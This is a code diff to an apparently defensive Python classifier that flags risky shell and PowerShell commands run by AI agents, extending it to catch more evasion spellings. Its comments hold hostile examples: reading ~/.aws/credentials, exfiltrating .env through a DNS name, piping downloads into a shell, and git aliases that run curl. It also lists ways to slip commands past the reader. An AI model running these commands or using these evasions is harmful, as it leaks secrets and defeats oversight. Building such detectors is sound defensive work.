@@ -14,22 +14,29 @@ says which of these classes the command line falls into:
                   download piped to a shell, iex
     secret_read   names a credential file or an agent's configuration (cat .env, cat
                   ~/.aws/credentials), or prints the environment (env, printenv, set, Get-ChildItem env:)
-    config_write  writes to such a file: a redirect (> or >>), tee, cp, mv, Set-Content,
+    config_write  writes to such a file: a redirect (>, >> or <>), tee, cp, mv, Set-Content,
                   Out-File, [IO.File]::WriteAllText ... with an agent's configuration, a
-                  credential file or the PowerShell profile ($PROFILE) as a target
+                  credential file or the PowerShell profile ($PROFILE) as a target; or
+                  a command line that changes into such a folder (cd .claude) and runs
+                  anything that may write
     obfuscation   hides what runs: base64 -d piped to a shell, powershell -EncodedCommand,
-                  eval, iex, bash -c with a $( ) in its command
+                  eval, iex, bash -c with a $( ) in its command, text piped into a shell
+                  or an interpreter that runs it (echo 'curl x' | bash), a command's
+                  output run as a script (bash <(...))
     encoded_host  a host name that carries data: a label of 32 or more characters, one that
                   looks like hex or base32, or one built from a command's output
                   (ping $(cat .env | base64).x.example)
 
+PowerShell reads the typographic quotes (‘ ’ ‚ ‛ “ ” „) as quotes and the en
+dash, em dash and horizontal bar as "-"; so does this reader.
+
 A command that cannot be read with certainty is "unreadable": an unclosed
 quote or $( ), a heredoc or here-string, ANSI-C quoting ($'...'), a program
 chosen at run time ($c args, PowerShell's & $c, & (...) and . (...)), a program
-name with a wildcard or a brace expansion (/???/cur?, {curl,x}), more than
-MAX_SEGMENTS commands, more than MAX_COMMAND_CHARS characters, deeper nesting
-than MAX_DEPTH, or a control character. The policy decides what happens to it
-(see CommandRule).
+name with a wildcard or a brace expansion (/???/cur?, {curl,x}), a shell's -c
+that cannot be placed (bash -o -c x), more than MAX_SEGMENTS commands, more than
+MAX_COMMAND_CHARS characters, deeper nesting than MAX_DEPTH, or a control
+character. The policy decides what happens to it (see CommandRule).
 
 This raises the bar; it is not a boundary. A shell can reach the same ends in
 ways no text reading follows: variables and aliases set earlier (c=curl in an
@@ -62,7 +69,7 @@ CLASS_TEXT = {
     INSTALL: "installs or runs code from a package registry or the web",
     SECRET_READ: "reads a credential file or an agent's configuration, or prints the environment",
     CONFIG_WRITE: "writes to an agent's configuration or a credential file",
-    OBFUSCATION: "hides what it runs (decoded or evaluated text)",
+    OBFUSCATION: "hides what it runs (decoded, evaluated or piped-in text)",
     ENCODED_HOST: "names a host that looks like it carries data",
 }
 # allow_programs can lift these classes for one program; the others are about words, not programs.
@@ -81,6 +88,12 @@ _READINGS_KEPT = 64  # read_command's cache
 _SUBST = "\x00"
 # Stands for a PowerShell ( ) group in an argument ("Set-Content ('x') y"), as a word of its own.
 _GROUP = "\x01"
+# PowerShell's tokenizer reads ‘ ’ ‚ ‛ as ', “ ” „ as ", and the en dash, em dash and horizontal bar as -
+# (in parameters and operators, and powershell.exe in its own options): & ‘curl.exe’ x runs curl.
+_POWERSHELL_PLAIN = str.maketrans({"\u2018": "'", "\u2019": "'", "\u201a": "'", "\u201b": "'", "\u201c": '"',
+                                   "\u201d": '"', "\u201e": '"', "\u2013": "-", "\u2014": "-", "\u2015": "-"})
+# The dashes powershell.exe and pwsh accept before their own options (–Command, —EncodedCommand).
+_DASHES = "-\u2013\u2014\u2015"
 
 
 class Unreadable(Exception):
@@ -164,6 +177,9 @@ class _Command:
     position: int  # place in the pipeline: 0 is the first
     written: str = ""  # the program's word as written
     groups: tuple[str, ...] = ()  # PowerShell: the words of its ( ), $( ) and @( ) arguments
+    chdir: tuple[str, ...] = ()  # folders it runs in: env -C x, sudo -D x, wsl --cd x, git -C x, make -C x
+    fed: str | None = None  # run by xargs or parallel: the text they replace with each input ("" = added at the end)
+    relined: bool = False  # run by wsl, whose Linux shell reads the program and its words again as a command line
 
 
 # A segment of a pipeline: a simple command's text (quotes kept), and the texts of its PowerShell groups.
@@ -174,6 +190,8 @@ def _read(text: str, shell: str, budget: _Budget, depth: int) -> list[_Command]:
     """Every simple command of `text`, nested ones included (and the ones bash -c and the like run)."""
     if depth > MAX_DEPTH:
         raise Unreadable("it nests commands more deeply than is followed")
+    if shell == "powershell":
+        text = text.translate(_POWERSHELL_PLAIN)
     splitter = _BashSplitter if shell == "bash" else _PowerShellSplitter
     pipelines = splitter(text, budget, depth).split()
     commands: list[_Command] = []
@@ -657,8 +675,9 @@ def _powershell_skip_double_quoted(text: str, start: int, depth: int) -> int:
 
 # ---- words ---------------------------------------------------------------------------------
 
-# A redirection operator on its own (shlex keeps them apart from words): >, >>, &>, >|, 2>, *> ...
-_REDIRECT = re.compile(r"([0-9]*|\*|&)>>?[|&]?")
+# A redirection operator on its own (shlex keeps them apart from words): >, >>, &>, >|, 2>, *> ..., and
+# <>, which opens its file for reading AND writing (echo x 1<> f overwrites the start of f).
+_REDIRECT = re.compile(r"([0-9]*|\*|&)>>?[|&]?|[0-9]*<>")
 
 
 def _bash_words(segment: str) -> tuple[list[str], list[str]]:
@@ -754,7 +773,7 @@ _HEADERS = frozenset({"for", "select", "case", "in", "esac"})
 _ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=")
 # Programs that run the program named after them, and their options that take a value.
 _WRAPPERS: dict[str, frozenset[str]] = {
-    "sudo": frozenset({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "--user", "--group"}),
+    "sudo": frozenset({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "--user", "--group", "--chdir"}),
     "doas": frozenset({"-u", "-C"}),
     "nohup": frozenset(),
     "nice": frozenset({"-n", "--adjustment"}),
@@ -781,13 +800,28 @@ _WRAPPERS: dict[str, frozenset[str]] = {
     "&": frozenset(),  # PowerShell's call operator
     ".": frozenset(),  # PowerShell's dot-sourcing (only there: in Bash "." reads a script file)
     "call": frozenset(),  # cmd
-    "start": frozenset(),  # cmd
+    "start": frozenset({"/d", "/affinity", "/node"}),  # cmd; its options start with "/"
+    "runas": frozenset(),  # Windows: runas /user:x "curl ..."
     "start-process": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle", "-credential",
                                 "-redirectstandardoutput", "-redirectstandardinput", "-redirectstandarderror"}),
     "saps": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle"}),
+    # Windows launchers: wsl runs a Linux program (through its shell, unless -e), conhost and winpty a console one.
+    "wsl": frozenset({"-d", "--distribution", "-u", "--user", "--cd", "--shell-type", "--distribution-id"}),
+    "conhost": frozenset({"--width", "--height", "--signal", "--server", "--feature", "--vtmode"}),
+    "winpty": frozenset(),
 }
 # Wrappers followed by one word that is not the program: timeout's duration, chroot's root, flock's lock file.
 _WRAPPERS_WITH_A_VALUE = frozenset({"timeout", "chroot", "flock"})
+# Wrappers whose options start with "/" (cmd's start, runas).
+_SLASH_OPTION_WRAPPERS = frozenset({"start", "runas"})
+# The options of a wrapper (or of git and make) that name the folder the program runs in. Case counts
+# (git -c is a setting, git -C a folder), except for cmd's and PowerShell's own options.
+_CHDIR_OPTIONS = {
+    "env": ("-C", "--chdir"), "sudo": ("-D", "--chdir"), "wsl": ("--cd",), "git": ("-C",),
+    "make": ("-C", "--directory"), "start": ("/d",), "start-process": ("-workingdirectory",),
+    "saps": ("-workingdirectory",),
+}
+_CASELESS_OPTIONS = frozenset({"start", "start-process", "saps"})
 _STRIPPED_EXTENSIONS = (".exe", ".cmd", ".bat", ".ps1")
 # What makes Bash expand a program's name into another one: *, ?, {a,b} or {a..b}; and [...], which
 # _check_program_word looks for without a pattern (a pattern would scan the rest of the word from every "[").
@@ -847,8 +881,13 @@ def _simple_commands(words: list[str], targets: list[str], shell: str, pipeline:
         if shell == "powershell" and rest and rest[0] == _GROUP:
             rest.pop(0)  # the condition of if ( ... ) or while ( ... ), read as commands of its own
 
+    chdir: list[str] = []
+    fed: str | None = None
+    relined = False
+
     def command(program: str, after: list[str], written: str = "") -> _Command:
-        return _Command(program, tuple(after), tuple(targets), shell, pipeline, position, written, groups)
+        return _Command(program, tuple(after), tuple(targets), shell, pipeline, position, written, groups,
+                        tuple(chdir), fed, relined)
 
     if not rest:
         return [command("", [])] if targets or groups else []
@@ -862,16 +901,66 @@ def _simple_commands(words: list[str], targets: list[str], shell: str, pipeline:
             return [command("", rest)]
         _check_program_word(word, shell)
         name = _program_name(word)
+        if shell == "powershell" and name == "start":
+            name = "start-process"  # in PowerShell, start is Start-Process
         if name not in _WRAPPERS or peeled >= _MAX_WRAPPERS or (name == "." and shell != "powershell"):
             break
-        after = _after_wrapper(name, rest[1:])
-        if after is None:  # "env" alone, "command -v curl": the wrapper is the program
+        found = _after_wrapper(name, rest[1:])
+        if found is None:  # "env" alone, "command -v curl": the wrapper is the program
             break
-        rest = after
+        rest, options = found
+        chdir.extend(_chdir_values(name, options))
+        if name in ("xargs", "parallel"):
+            fed = _placeholder(name, options)
+        relined = relined or name == "wsl" and not any(option.lower() in ("-e", "--exec") for option in options)
         peeled += 1
     if not rest:
         return []
-    return [command(_program_name(rest[0]), rest[1:], rest[0])]
+    program = _program_name(rest[0])
+    if program == "git":
+        chdir.extend(_chdir_values(program, _leading_options(rest[1:], _GIT_OPTIONS_WITH_VALUE)))
+    elif program == "make":
+        chdir.extend(_chdir_values(program, rest[1:]))
+    return [command(program, rest[1:], rest[0])]
+
+
+def _leading_options(words: list[str], with_value: frozenset[str]) -> list[str]:
+    """The options (and their values) before a program's first word that is not an option."""
+    i = 0
+    while i < len(words) and words[i].startswith("-") and words[i] != "-":
+        i += 2 if words[i] in with_value else 1
+    return words[:i]
+
+
+def _chdir_values(name: str, options: list[str]) -> list[str]:
+    """The folders a wrapper's (or git's, make's) options make the program run in: env -C x, sudo --chdir=x."""
+    names = _CHDIR_OPTIONS.get(name, ())
+    found = []
+    for index, option in enumerate(options):
+        spelled = option.lower() if name in _CASELESS_OPTIONS else option
+        for wanted in names:
+            if spelled == wanted and index + 1 < len(options):
+                found.append(options[index + 1])
+            elif spelled.startswith((wanted + "=", wanted + ":")) or (
+                    len(wanted) == 2 and len(spelled) > 2 and spelled.startswith(wanted)):
+                found.append(option[len(wanted):].lstrip("=:"))  # --chdir=x, -Cx
+    return found
+
+
+def _placeholder(name: str, options: list[str]) -> str:
+    """The text xargs -I (or parallel) replaces with each input in the command; "" when xargs adds it at the end."""
+    for index, option in enumerate(options):
+        if option == "-I" and index + 1 < len(options):
+            return options[index + 1]
+        if option.startswith("-I") and len(option) > 2:
+            return option[2:]
+        if name == "xargs" and option in ("-i", "--replace"):
+            return "{}"
+        if name == "xargs" and option.startswith("-i"):
+            return option[2:]
+        if name == "xargs" and option.startswith("--replace="):
+            return option.partition("=")[2]
+    return "{}" if name == "parallel" else ""
 
 
 def _powershell_statement(words: list[str]) -> list[str]:
@@ -883,8 +972,9 @@ def _powershell_statement(words: list[str]) -> list[str]:
     return words
 
 
-def _after_wrapper(name: str, words: list[str]) -> list[str] | None:
-    """The words from the wrapped program on, or None when the wrapper runs nothing itself.
+def _after_wrapper(name: str, words: list[str]) -> tuple[list[str], list[str]] | None:
+    """The words from the wrapped program on, and the wrapper's own words before them; None when the
+    wrapper runs nothing itself.
 
     env -S 'curl x' and flock f -c 'curl x' give a command text as one word: it
     becomes the program word, which _inner_commands reads as a command line.
@@ -892,6 +982,7 @@ def _after_wrapper(name: str, words: list[str]) -> list[str] | None:
     takes_value = _WRAPPERS[name]
     if name == "command" and words and words[0] in ("-v", "-V"):
         return None
+    slash_options = name in _SLASH_OPTION_WRAPPERS
     i = 0
     while i < len(words):
         word = words[i]
@@ -901,35 +992,48 @@ def _after_wrapper(name: str, words: list[str]) -> list[str] | None:
         elif name == "env" and (word in ("-S", "--split-string") or word.startswith(("-S", "--split-string="))):
             # env -S 'curl x' splits the text into the program and its words.
             if word in ("-S", "--split-string"):
-                return words[i + 1:] or None
-            return [word[2:] if word.startswith("-S") else word.partition("=")[2], *words[i + 1:]]
-        elif lowered.startswith("-") and lowered != "-":
+                return (words[i + 1:], words[:i + 1]) if words[i + 1:] else None
+            return [word[2:] if word.startswith("-S") else word.partition("=")[2], *words[i + 1:]], words[:i + 1]
+        elif lowered.startswith("-") and lowered != "-" or slash_options and lowered.startswith("/") and lowered != "/":
             if name in ("start-process", "saps") and "-filepath".startswith(lowered) and len(lowered) > 1:
-                return words[i + 1:] or None
-            i += 2 if lowered in takes_value else 1
+                return (words[i + 1:], words[:i + 1]) if words[i + 1:] else None
+            # Case counts for Unix options (xargs -I {} takes a value, -i does not); not for cmd's and PowerShell's.
+            i += 2 if word in takes_value or name in _CASELESS_OPTIONS and lowered in takes_value else 1
         else:
             break
     if name in _WRAPPERS_WITH_A_VALUE and i < len(words):
         i += 1  # the duration, the new root or the lock file
+    if name == "start" and i < len(words) and (not words[i] or any(ch.isspace() for ch in words[i])):
+        i += 1  # cmd's start takes a first quoted word as the window's title: start "" curl x
     if name == "flock" and words[i:i + 1] and words[i] in ("-c", "--command"):
-        return words[i + 1:i + 2] or None  # flock f -c 'curl x'
-    return words[i:] or None
+        return (words[i + 1:i + 2], words[:i + 1]) if words[i + 1:i + 2] else None  # flock f -c 'curl x'
+    return (words[i:], words[:i]) if words[i:] else None
 
 
 def _inner_commands(command: _Command, budget: _Budget, depth: int) -> Iterator[_Command]:
-    """Commands that this one runs from its words: bash -c, pwsh -Command, cmd /c, find -exec, a quoted program."""
+    """Commands that this one runs from its words: bash -c, pwsh -Command, cmd /c, find -exec, a quoted program,
+    the words wsl hands to its Linux shell, git settings that are commands, parallel ::: 'command'."""
     program, words = command.program, list(command.words)
     quoted_text = any(ch.isspace() for ch in command.written)
+    call = _shell_call(program, words)
+    texts = [text for text, _ in call.texts] if call else []
+    git_texts = _git_command_texts(words) if program == "git" else []
     if depth + 1 > MAX_DEPTH:
-        if _shell_script(program, words) is not None or program == "find" or quoted_text:
+        if texts or git_texts or program in ("find", ":::") or quoted_text or command.relined:
             raise Unreadable("it nests commands more deeply than is followed")
         return
-    script = _shell_script(program, words)
-    if script is not None and _SUBST not in script[0]:
-        # A script that is a command's output ("sh -c "$(curl ...)"") cannot be read: that command was
-        # read already, and the shell running its output counts as obfuscation (and install after a download).
-        text, shell = script
-        yield from _read(text, shell, budget, depth + 1)
+    for text, shell in call.texts if call else ():
+        if _SUBST not in text:
+            # A script that is a command's output ("sh -c "$(curl ...)"") cannot be read: that command was read
+            # already, and the shell running its output counts as obfuscation (and install after a download).
+            yield from _read(text, shell, budget, depth + 1)
+    for text in git_texts:
+        yield from _read(text, "bash", budget, depth + 1)
+    if program == ":::":  # parallel ::: 'curl x' 'wget y' runs each word as a command line
+        for word in words:
+            yield from _read(word, "bash", budget, depth + 1)
+    if command.relined:
+        yield from _read(" ".join([command.written, *words]), "bash", budget, depth + 1)
     if program == "find":
         for index, word in enumerate(words):
             if word in ("-exec", "-execdir", "-ok", "-okdir"):
@@ -957,7 +1061,29 @@ def _quoted(word: str, shell: str) -> str:
     return "'" + word.replace("'", "'\\''") + "'"
 
 
-_POSIX_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh"})
+_BASH_FAMILY = frozenset({"bash", "sh", "rbash"})
+_CSH_FAMILY = frozenset({"csh", "tcsh"})
+_KSH_FAMILY = frozenset({"ksh", "ksh93", "mksh", "pdksh", "oksh", "loksh"})
+_POSIX_SHELLS = _BASH_FAMILY | _CSH_FAMILY | _KSH_FAMILY | frozenset({"zsh", "dash", "ash", "yash", "posh", "fish"})
+# bash's long options, which it reads before its one-letter ones, with two dashes or one (--rcfile f, -norc).
+_BASH_LONG_OPTIONS = frozenset({
+    "debug", "debugger", "dump-po-strings", "dump-strings", "help", "init-file", "login", "noediting", "noprofile",
+    "norc", "posix", "pretty-print", "protected", "rcfile", "restricted", "verbose", "version", "wordexp",
+})
+_BASH_LONG_WITH_VALUE = frozenset({"init-file", "rcfile"})
+# fish reads its options as getopt does ("+hPilNnvc:C:p:d:f:D:o:"): these letters take a value, -c and -C
+# (--init-command) a command text. Its long options may be shortened to any prefix that names one option.
+_FISH_VALUE_LETTERS = frozenset("cCpdfDo")
+_FISH_LONG_OPTIONS = {
+    "command": "c", "init-command": "C", "debug": "d", "debug-output": "o", "debug-stack-frames": "D",
+    "features": "f", "profile": "p", "profile-startup": "p", "help": "", "interactive": "", "login": "",
+    "no-execute": "", "no-config": "", "private": "", "version": "", "print-rusage-self": "",
+    "print-debug-categories": "",
+}
+# A word a shell may take for its -c: -c, -ec, +c, -xc ... (bash and dash run the command for +c too).
+_C_OPTION = re.compile(r"[-+][A-Za-z]*c[A-Za-z]*")
+# The names under which a program reads its standard input as a file.
+_STDIN_NAMES = frozenset({"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"})
 # Programs that run the command text after -c (or --command) with a shell: su -c 'x', script -qc 'x'.
 _DASH_C_RUNNERS = frozenset({"su", "runuser", "script", "sg"})
 _POWERSHELLS = frozenset({"powershell", "pwsh"})
@@ -967,49 +1093,211 @@ _POWERSHELL_OPTIONS_WITH_VALUE = frozenset({
     "outputformat", "o", "of", "configurationname", "config", "workingdirectory", "wd", "settingsfile",
     "psconsolefile", "custompipename", "encodedcommand", "e", "ec", "en", "enc", "enco", "encodedarguments", "ea",
 })
+# cmd.exe runs what follows its first /c, /k or /r, wherever it is and whatever is glued to it.
+_CMD_RUN_SWITCH = re.compile(r"/([ckr])", re.IGNORECASE)
 
 
-def _shell_script(program: str, words: list[str]) -> tuple[str, str] | None:
-    """The command text a shell program is given to run, and that text's shell; None if there is none."""
+@dataclass(frozen=True)
+class _ShellCall:
+    """What a shell program is told to run."""
+
+    texts: tuple[tuple[str, str], ...] = ()  # command texts (bash -c 'x'), each with the shell that reads it
+    stdin: bool = False  # it runs the commands of its standard input (echo 'curl x' | bash)
+    missing: bool = False  # it was told to run a command text (-c) that is not there: xargs may add it
+    script: str | None = None  # the script file it runs (bash -e x.sh, pwsh -File x.ps1)
+
+
+def _shell_call(program: str, words: list[str]) -> _ShellCall | None:
+    """What a shell program runs (see _ShellCall); None for a program that is not a shell."""
+    if program == "fish":
+        return _fish_call(words)
     if program in _POSIX_SHELLS:
-        for index, word in enumerate(words):
-            if re.fullmatch(r"-[a-zA-Z]*c[a-zA-Z]*", word) and not word.startswith("--"):
-                return (words[index + 1], "bash") if index + 1 < len(words) else None
-            if not word.startswith("-"):
-                return None  # a script file
-        return None
+        return _posix_shell_call(program, words)
     if program in _DASH_C_RUNNERS:
         # The -c may come after a user or group name (su root -c x, sg staff -c x), so every word is looked at.
         for index, word in enumerate(words):
             if word.startswith("--command="):
-                return word.partition("=")[2], "bash"
+                return _ShellCall(((word.partition("=")[2], "bash"),))
             if word == "--command" or re.fullmatch(r"-[a-zA-Z]*c", word):
-                return (words[index + 1], "bash") if index + 1 < len(words) else None
-        return None
+                if index + 1 < len(words):
+                    return _ShellCall(((words[index + 1], "bash"),))
+                return _ShellCall(missing=True)
+        return _ShellCall()
     if program in _POWERSHELLS:
-        skip = False
-        for index, word in enumerate(words):
-            if skip:
-                skip = False
-                continue
-            option = word.lstrip("-/").lower() if word[:1] in ("-", "/") else None
-            if option is None:
-                # powershell.exe reads the rest as a command; pwsh as a script file and its arguments.
-                return (" ".join(words[index:]), "powershell") if program == "powershell" else None
-            if option in ("c", "command") or (len(option) >= 3 and "command".startswith(option)):
-                rest = " ".join(words[index + 1:])
-                return (rest, "powershell") if rest and rest != "-" else None
-            if option in ("f", "file") or (len(option) >= 2 and "file".startswith(option)):
-                return None
-            skip = option in _POWERSHELL_OPTIONS_WITH_VALUE
-        return None
+        return _powershell_call(program, words)
     if program == "cmd":
-        for index, word in enumerate(words):
-            if word.lower() in ("/c", "/k", "/r"):
-                rest = " ".join(words[index + 1:]).replace("^", "")
-                return (rest, "bash") if rest else None
-        return None
+        line = " ".join(words)
+        found = _CMD_RUN_SWITCH.search(line)
+        if found is None:
+            return _ShellCall(stdin=True)
+        rest = line[found.end():].replace("^", "").strip()  # /ccurl x, /c"curl x", //ccurl x (Git Bash)
+        return _ShellCall(((rest, "bash"),)) if rest else _ShellCall(missing=True)
     return None
+
+
+def _posix_shell_call(program: str, words: list[str]) -> _ShellCall:
+    """bash -o pipefail -c 'x', bash -euo pipefail -c 'x', bash -c -e 'x' and bash +x -c 'x' all run x.
+
+    As bash (and dash, zsh, ksh) read their options: bash's long options come
+    first (--rcfile f, -norc); then words that start with - or +, each a group of
+    letters, where -o and -O (and ksh's -R, -T) take the next word as a value;
+    "-" or "--" ends them. With a c among the letters, the first word after the
+    options is the command text; csh takes the word right after its -c. A -c
+    that lands where the reader cannot place it (as an option's value, or after a
+    script file) makes the command unreadable.
+    """
+    n, i = len(words), 0
+    values: list[str] = []  # words taken as an option's value
+    if program in _BASH_FAMILY:
+        while i < n and words[i].startswith("-"):
+            name = words[i][2:] if words[i].startswith("--") else words[i][1:]
+            if name not in _BASH_LONG_OPTIONS:
+                break
+            if name in _BASH_LONG_WITH_VALUE and i + 1 < n:
+                values.append(words[i + 1])
+                i += 1
+            i += 1
+    value_letters = "oORT" if program in _KSH_FAMILY else "oO"
+    texts: list[str] = []
+    wants = reads_stdin = False
+    while i < n:
+        word = words[i]
+        if word in ("-", "--"):
+            i += 1
+            break
+        if word[:1] not in ("-", "+"):
+            break
+        i += 1
+        if word.startswith("--"):
+            continue  # a long option of zsh (--emacs); bash refuses one after its one-letter options
+        for letter in word[1:]:
+            if letter == "c":
+                wants = True
+                if program in _CSH_FAMILY and i < n:
+                    texts.append(words[i])
+                    i += 1
+            elif letter == "s":
+                reads_stdin = True
+            elif letter in value_letters and i < n:
+                values.append(words[i])
+                i += 1
+    if wants and program not in _CSH_FAMILY and i < n:
+        texts.append(words[i])
+    if any(_C_OPTION.fullmatch(value) for value in values) or (
+            not wants and any(_C_OPTION.fullmatch(word) for word in words[i:])):
+        raise Unreadable(f"a -c given to {program} cannot be placed with certainty")
+    stdin = not wants and (i >= n or reads_stdin or words[i] in _STDIN_NAMES)
+    return _ShellCall(tuple((text, "bash") for text in texts), stdin=stdin, missing=wants and not texts,
+                      script=words[i] if not wants and not stdin else None)
+
+
+def _fish_call(words: list[str]) -> _ShellCall:
+    """fish -c 'x', fish -cx, fish --command=x, fish --comm x and fish -C x (an init command) run x."""
+    n, i = len(words), 0
+    texts: list[str] = []
+    given = missing = False  # a -c was given (not only -C); it had no text
+    while i < n:
+        word = words[i]
+        if word == "--":
+            i += 1
+            break
+        if not word.startswith("-") or word == "-":
+            break
+        i += 1
+        letter, value = "", None
+        if word.startswith("--"):
+            name, equals, attached = word[2:].partition("=")
+            matches = [name] if name in _FISH_LONG_OPTIONS else [long for long in _FISH_LONG_OPTIONS
+                                                                  if long.startswith(name)]
+            if len(matches) != 1:
+                raise Unreadable("an option given to fish cannot be told apart from another")
+            letter = _FISH_LONG_OPTIONS[matches[0]]
+            value = attached if equals else None
+        else:
+            for at, char in enumerate(word[1:]):
+                if char in _FISH_VALUE_LETTERS:
+                    letter, value = char, word[2 + at:] or None
+                    break
+        if letter and value is None:
+            value = words[i] if i < n else None
+            i += 1
+        if letter == "c":
+            given = True
+            missing = missing or value is None
+        if letter in ("c", "C") and value is not None:
+            texts.append(value)
+    if not given and any(_C_OPTION.fullmatch(word) or word.startswith("--c") for word in words[i:]):
+        raise Unreadable("a -c given to fish cannot be placed with certainty")
+    stdin = not given and (i >= n or words[i] in _STDIN_NAMES)
+    return _ShellCall(tuple((text, "bash") for text in texts), stdin=stdin, missing=missing,
+                      script=words[i] if not given and not stdin else None)
+
+
+def _powershell_call(program: str, words: list[str]) -> _ShellCall:
+    """powershell -Command x (also –Command, with an en dash), powershell.exe's positional command, -File -,
+    and a powershell given no command, which runs the commands of its standard input."""
+    skip = False
+    for index, word in enumerate(words):
+        if skip:
+            skip = False
+            continue
+        option = word.lstrip(_DASHES + "/").lower() if word and word[0] in _DASHES + "/" else None
+        if option is None:
+            # powershell.exe reads the rest as a command; pwsh as a script file and its arguments.
+            if program == "powershell":
+                return _ShellCall(((" ".join(words[index:]), "powershell"),))
+            return _ShellCall(script=word)
+        if option in ("c", "command") or (len(option) >= 3 and "command".startswith(option)):
+            rest = " ".join(words[index + 1:])
+            return _ShellCall(((rest, "powershell"),)) if rest and rest != "-" else _ShellCall(stdin=True)
+        if option in ("f", "file") or (len(option) >= 2 and "file".startswith(option)):
+            script = words[index + 1] if index + 1 < len(words) else None
+            return _ShellCall(stdin=script == "-", script=script if script != "-" else None)
+        if _encoded_command_option(option):
+            return _ShellCall()  # the code is in the option's value (obfuscation)
+        skip = option in _POWERSHELL_OPTIONS_WITH_VALUE
+    return _ShellCall(stdin=True)
+
+
+def _encoded_command_option(option: str) -> bool:
+    """-ec, -e, -enc, -EncodedCommand ... (option is lowercased, without its dash)."""
+    return option == "ec" or (option.startswith("e") and "encodedcommand".startswith(option))
+
+
+# git settings whose value is a command git runs (an alias that starts with "!", core.sshCommand ...), or,
+# for an alias without "!", git words ("alias.x=push" makes "git x" a push).
+_GIT_COMMAND_SETTING = re.compile(
+    r"alias\..+|core\.(sshcommand|fsmonitor|pager|editor|askpass)|credential\..*helper|diff\.external|"
+    r"(diff|merge|filter)\..+\.(command|driver|textconv|clean|smudge|process)|gpg(\..+)?\.program|"
+    r"sequence\.editor|pager\..+|interactive\.difffilter|uploadpack\.packobjectshook|(difftool|mergetool|man)\..+\.cmd",
+    re.IGNORECASE,
+)
+
+
+def _git_command_texts(words: list[str]) -> list[str]:
+    """The command lines in git's settings: git -c alias.x='!curl ...' x, git config alias.x '!curl ...'."""
+    pairs: list[tuple[str, str]] = []
+    options = _leading_options(words, _GIT_OPTIONS_WITH_VALUE)
+    for index, option in enumerate(options):
+        if option == "-c" and index + 1 < len(options):
+            key, _, value = options[index + 1].partition("=")
+            pairs.append((key, value))
+        elif option.startswith("--config-env=") and _GIT_COMMAND_SETTING.fullmatch(option[13:].partition("=")[0]):
+            raise Unreadable("git takes a setting that runs a command from an environment variable")
+    rest = _positional(words[len(options):], frozenset({"-f", "--file", "--blob", "--type", "--default", "--comment"}))
+    if rest[:1] == ["config"]:
+        rest = rest[2:] if rest[1:2] == ["set"] else rest[1:]  # git config [set] <key> <value>
+        if len(rest) >= 2:
+            pairs.append((rest[0], rest[1]))
+    texts = []
+    for key, value in pairs:
+        if not _GIT_COMMAND_SETTING.fullmatch(key) or not value:
+            continue
+        if key.lower().startswith("alias.") and not value.startswith("!"):
+            texts.append("git " + value)
+        else:
+            texts.append(value[1:] if value.startswith("!") else value)
+    return texts
 
 
 # ---- classes --------------------------------------------------------------------------------
@@ -1069,7 +1357,36 @@ _PROGRAM_WRITERS = frozenset({
     "set-content", "sc", "add-content", "ac", "out-file", "new-item", "ni", "copy-item", "copy", "cpi", "move-item",
     "move", "mi", "remove-item", "ri", "del", "erase", "rename-item", "ren", "rni", "set-itemproperty",
     "tee-object", "export-csv", "export-clixml", "xcopy", "robocopy",
+    # Programs that unpack or patch files into a folder they are given: unzip x.zip -d .claude (tar when it extracts).
+    "unzip", "7z", "7za", "expand-archive", "patch",
 })
+# Programs that write the text they are given (from the command line or its pipe) to the files they name.
+_TEXT_WRITERS = frozenset({"tee", "tee-object", "set-content", "sc", "add-content", "ac", "out-file"})
+# Programs that change the folder later commands of the line run in.
+_CD_PROGRAMS = frozenset({"cd", "chdir", "pushd", "set-location", "sl", "push-location"})
+# Folders that hold an agent's or a tool's configuration, git's hooks and settings, or keys: a command
+# line that changes into one and then writes may write a file there by a plain relative name.
+_PROTECTED_FOLDER = re.compile(
+    r"(^|[\\/:])\.(git|github|vscode|cursor|claude|codeium|gemini|windsurf|codex|agent-sentinel)([\\/]|$)"
+    r"|(^|[\\/])\.[^\\/]*[*?\[]",  # a hidden folder spelled with a wildcard (cd .cl*)
+    re.IGNORECASE,
+)
+# Programs that only read (with no redirection), after a change into such a folder.
+_READ_ONLY_PROGRAMS = frozenset({
+    "cd", "chdir", "pushd", "popd", "set-location", "sl", "push-location", "pop-location", "ls", "dir", "pwd",
+    "cat", "type", "head", "tail", "less", "more", "grep", "egrep", "fgrep", "rg", "wc", "stat", "file", "tree",
+    "echo", "printf", "true", "false", "test", "[", "[[", "which", "where", "whoami", "date", "basename",
+    "dirname", "realpath", "readlink", "du", "df", "diff", "cmp", "jq", "sha256sum", "sha1sum", "md5sum", "cksum",
+    "exit", "get-childitem", "gci", "get-content", "gc", "get-item", "gi", "select-string", "sls", "test-path",
+    "resolve-path", "rvpa", "get-location", "gl", "write-output", "write", "write-host", "measure-object",
+    "measure", "select-object", "select", "where-object", "?", "sort-object", "format-list", "fl", "format-table",
+    "ft", "out-string", "out-host", "out-null", "convertfrom-json", "convertto-json", "get-filehash",
+    "get-itemproperty", "gp", "get-acl", "foreach-object", "%",
+})
+_GIT_READ_ONLY = frozenset({"status", "log", "diff", "show", "blame", "grep", "ls-files", "rev-parse", "describe",
+                            "shortlog", "cat-file", "ls-tree"})
+# Redirection targets that are not files: discarded output, or the terminal.
+_NOT_FILES = frozenset({"/dev/null", "nul", "$null", "/dev/stdout", "/dev/stderr", "/dev/tty", "con"})
 # .NET file writes in PowerShell words: [IO.File]::WriteAllText(...), [IO.File]::Copy(...), a StreamWriter.
 _DOTNET_WRITE = re.compile(
     r"::(write\w*|append\w*|create\w*|copy|move|replace|open|openwrite)\b|streamwriter|filestream",
@@ -1122,7 +1439,70 @@ def _findings(commands: list[_Command]) -> Iterator[Finding]:
         # bash <(curl ...), sh -c "$(curl ...)", source <(wget ...): a download run as a script.
         if network_anywhere and command.program in _INTERPRETERS and any(_SUBST in word for word in command.words):
             found.append(_finding(INSTALL, command, f"program '{command.program}' runs a command's output"))
+    found.extend(_writes_after_changing_folder(commands))
+    found.extend(_runs_what_it_wrote(commands))
     yield from found
+
+
